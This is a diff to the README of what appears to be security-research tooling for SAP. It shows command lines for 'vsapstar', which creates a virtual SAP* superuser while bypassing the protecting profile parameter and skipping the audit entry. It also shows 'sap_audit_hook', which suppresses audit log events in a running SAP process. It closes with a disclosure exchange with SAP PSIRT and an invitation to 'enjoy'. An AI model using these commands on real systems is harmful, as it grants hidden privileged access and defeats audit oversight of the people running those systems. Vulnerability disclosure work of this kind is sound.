@@ -31,16 +31,19 @@ Capabilities:
 
 ```
 ./vsapstar -c 100 -v 10 -q
-→ ABCDEFGHIJ1234567890ABCDEFGHIJ1234567890
+
+ABCDEFGHIJ1234567890ABCDEFGHIJ1234567890
 
 ./vsapstar -c 100 -v 10080 --bypass -P 2 --no-audit --no-profile-check
-→ [+] Created successfully
-→ user=SAP*, client=100, password=<40-char Base32>
-→ No EUP event in audit log
-→ login/create_virtual_user_sapstar=0 ignored
+
+[+] Created successfully
+user=SAP*, client=100, password=<40-char Base32>
+No EUP event in audit log
+login/create_virtual_user_sapstar=0 ignored
 ```
 
-Confirmed on SAP kernel 916 / S/4HANA 2023 and 2025.
+> [!NOTE]  
+> Confirmed on SAP kernel 916 / S/4HANA 2023 and 2025.
 
 
 
@@ -54,8 +57,8 @@ Modes:
 - **Filter** (`--filter CLASS`): target specific event classes, e.g. `AUW,AU3,EUP`
 
 ```
-sudo ./sap_audit_hook --pid 12345 --monitor
-sudo ./sap_audit_hook --pid 12345 --suppress --filter EUP
+./sap_audit_hook --pid 12345 --monitor
+./sap_audit_hook --pid 12345 --suppress --filter EUP
 ```
 
 Hook points:
@@ -71,9 +74,12 @@ Hook points:
 
 Hook addresses are resolved at runtime from the binary's ELF symbol table — no hardcoded offsets, works across builds.
 
+> [!NOTE]  
+> Confirmed on SAP kernel 916 / S/4HANA 2023 and 2025.
+
 ---
 
-## Build
+## Build the binaries yourself
 
 ```bash
 make           # build both tools
@@ -86,7 +92,7 @@ Requirements: `gcc`, Linux, glibc. No external dependencies.
 
 ---
 
-## Usage
+## Usage of the tools
 
 ### `vsapstar`
 
@@ -141,7 +147,7 @@ Usage: sap_audit_hook --pid <PID> [OPTIONS]
 
 
 
-## The SAP PSIRT Exchange
+## A comment from the SAP PSIRT
 
 These findings were reported to SAP PSIRT in June 2026. SAP's response, in full:
 
@@ -153,4 +159,4 @@ These findings were reported to SAP PSIRT in June 2026. SAP's response, in full:
 
 SAP is correct that `<sid>adm` OS access is a prerequisite. What the response does not address is that the feature ships with a profile parameter (`login/create_virtual_user_sapstar`) specifically intended to prevent this from working — and that parameter can be bypassed. It ships with an audit log entry specifically intended to record when this feature is used — and that entry can be suppressed. These are not properties of the underlying OS. They are properties of the SAP application.
 
-But per SAP PSIRT: false positive. So here we are.
+But per SAP PSIRT: false positive. So here we are - enjoy ;)
